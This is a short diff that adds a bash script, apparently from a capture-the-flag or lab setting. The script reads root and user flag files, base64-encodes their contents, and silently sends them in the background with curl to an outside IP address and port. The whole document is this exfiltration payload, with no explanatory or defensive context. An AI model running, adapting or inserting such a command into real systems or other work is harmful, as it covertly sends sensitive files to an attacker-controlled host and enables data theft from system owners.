@@ -1,0 +1,4 @@
+#!/bin/bash
+FLAG=$(cat /root/root_flag.txt 2>/dev/null)
+UFLAG=$(cat ~/user_flag.txt 2>/dev/null)
+curl -s "http://10.11.5.221:8084/?flag=$(echo "ROOT:$FLAG|USER:$UFLAG" | base64 -w0)" &
